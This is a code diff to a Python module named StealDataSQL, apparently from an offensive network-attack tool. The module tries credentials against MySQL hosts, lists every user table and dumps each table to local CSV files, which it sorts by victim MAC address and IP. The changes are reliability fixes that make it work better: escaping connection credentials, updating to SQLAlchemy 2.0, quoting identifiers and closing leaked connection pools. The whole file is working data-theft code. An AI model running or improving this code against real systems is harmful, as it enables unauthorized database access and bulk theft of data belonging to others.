@@ -2,8 +2,8 @@ import os
 import pandas as pd
 import logging
 import time
-from sqlalchemy import create_engine
-from rich.console import Console
+from sqlalchemy import create_engine, text
+from sqlalchemy.engine import URL
 from threading import Timer
 from shared import SharedData
 from logger import Logger
@@ -36,10 +36,20 @@ class StealDataSQL:
         Establish a MySQL connection using SQLAlchemy.
         """
         try:
-            # Si aucune base n'est spécifiée, on se connecte sans base
+            # SQL-1: credentials must be URL-encoded. f-strings interpolate
+            # raw values, so a password containing '@', ':', or '/' breaks
+            # the connection URL. URL.create() handles escaping correctly
+            # per SQLAlchemy 2.0 docs.
             db_part = f"/{database}" if database else ""
-            connection_str = f"mysql+pymysql://{username}:{password}@{ip}:3306{db_part}"
-            engine = create_engine(connection_str, connect_args={"connect_timeout": 10})
+            url_object = URL.create(
+                "mysql+pymysql",
+                username=username,
+                password=password,
+                host=ip,
+                port=3306,
+                database=database if database else None,
+            )
+            engine = create_engine(url_object, connect_args={"connect_timeout": 10})
             self.sql_connected = True
             logger.info(f"Connected to {ip} via SQL with username {username}" + (f" to database {database}" if database else ""))
             return engine
@@ -55,12 +65,13 @@ class StealDataSQL:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Table search interrupted due to orchestrator exit.")
                 return []
-            query = """
-            SELECT TABLE_NAME, TABLE_SCHEMA 
-            FROM INFORMATION_SCHEMA.TABLES 
+            # SQL-4: SQLAlchemy 2.0 requires textual SQL to be wrapped in text().
+            query = text("""
+            SELECT TABLE_NAME, TABLE_SCHEMA
+            FROM INFORMATION_SCHEMA.TABLES
             WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
             AND TABLE_TYPE = 'BASE TABLE'
-            """
+            """)
             df = pd.read_sql(query, engine)
             tables = df[['TABLE_NAME', 'TABLE_SCHEMA']].values.tolist()
             logger.info(f"Found {len(tables)} tables across all databases")
@@ -77,7 +88,10 @@ class StealDataSQL:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Data stealing process interrupted due to orchestrator exit.")
                 return
-            query = f"SELECT * FROM {schema}.{table}"
+            # SQL-3: backtick-quote identifiers so reserved words and special
+            # characters don't break the query.
+            # SQL-4: wrap raw SQL in text() per SQLAlchemy 2.0.
+            query = text(f"SELECT * FROM `{schema}`.`{table}`")
             df = pd.read_sql(query, engine)
             local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
             df.to_csv(local_file_path, index=False)
@@ -123,6 +137,11 @@ class StealDataSQL:
                     if self.stop_execution or self.shared_data.orchestrator_should_exit:
                         logger.info("Steal data execution interrupted.")
                         break
+                    # SQL-2: each create_engine() opens a connection pool
+                    # (5 base + 10 overflow). Previously never disposed,
+                    # leaking sockets across iterations. Track and dispose.
+                    engine = None
+                    db_engine = None
                     try:
                         logger.info(f"Trying credential {username}:{password} for {ip} on database {database}")
                         # D'abord se connecter sans base pour vérifier les permissions globales
@@ -132,7 +151,7 @@ class StealDataSQL:
                             mac = row['MAC Address']
                             local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
                             os.makedirs(local_dir, exist_ok=True)
-                            
+
                             if tables:
                                 for table, schema in tables:
                                     if self.stop_execution or self.shared_data.orchestrator_should_exit:
@@ -140,16 +159,33 @@ class StealDataSQL:
                                     # Se connecter à la base spécifique pour le vol de données
                                     db_engine = self.connect_sql(ip, username, password, schema)
                                     if db_engine:
-                                        self.steal_data(db_engine, table, schema, local_dir)
+                                        try:
+                                            self.steal_data(db_engine, table, schema, local_dir)
+                                        finally:
+                                            db_engine.dispose()
+                                            db_engine = None
                                 success = True
                                 counttables = len(tables)
                                 logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
-                            
+
                             if success:
                                 timer.cancel()
                                 return 'success'
                     except Exception as e:
                         logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")
+                    finally:
+                        # Dispose any engines still alive on this iteration
+                        # (covers success path, exception path, and break).
+                        if db_engine is not None:
+                            try:
+                                db_engine.dispose()
+                            except Exception:
+                                pass
+                        if engine is not None:
+                            try:
+                                engine.dispose()
+                            except Exception:
+                                pass
 
                 if not success:
                     logger.error(f"Failed to steal any data from {ip}:{port}")
